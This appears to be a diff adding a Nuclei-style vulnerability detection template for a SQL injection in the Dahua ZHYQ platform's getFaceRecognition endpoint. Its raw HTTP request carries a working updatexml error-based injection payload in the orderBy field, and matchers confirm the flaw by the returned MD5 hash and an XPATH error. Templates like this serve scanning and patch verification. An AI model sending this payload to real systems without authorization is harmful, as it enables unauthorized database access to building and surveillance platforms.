@@ -1,0 +1,28 @@
+id: poc-dahua-zhyq-getfacerecognition-sqli
+info:
+  name: Dahua ZHYQ Integrated Management Platform GetFaceRecognition SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli, dahua, management-platform
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml%281,concat%280x7e,%28select%20md5%28{{t1}}%29%29,0x7e%29,1%29--%22%7D/extend/1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "{{t2}}"
+          - "XPATH syntax error"
+          - "soap:Server"
+        part: body
